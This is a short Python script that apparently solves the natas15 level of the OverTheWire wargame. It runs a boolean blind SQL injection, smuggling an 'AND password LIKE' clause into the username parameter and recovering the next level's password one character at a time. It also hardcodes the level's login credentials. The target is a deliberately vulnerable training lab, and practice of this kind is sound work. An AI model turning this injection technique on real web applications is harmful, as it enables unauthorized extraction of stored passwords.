import requests, string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
query = "natas16\" AND password LIKE \"%"
characters = ''.join([string.ascii_letters, string.digits])
exists_str = "This user exists."
password = ""
# password = "aOlfEjHqj32V"
password_chars = []

# Gather list of all chars
# for char in characters:
#   test = ''.join([query, char, "%"])
#   r = requests.get(url, auth=(auth_username, auth_password), params={"username": test})

#   if exists_str in r.text:
#     password_chars.append(char)
#     # /
#     print(password_chars)

possible_chars = ['a', 'd', 'f', 'g', 'i', 'j', 'k', 'l', 'q', 'r', 'u', 'A', 'D', 'E', 'H', 'O', 'P', 'R', 'T', 'V', 'Z', '2', '3', '5', '7', '9']

for i in range(0, 32):
  for char in possible_chars:
    print ("Testing: " + password + char)
    test = ''.join([ query, password, char, "%" ])
    r = requests.get(url, auth=(auth_username, auth_password), params={"username": test})

    if exists_str in r.text:
      password += char
      print(password)
      break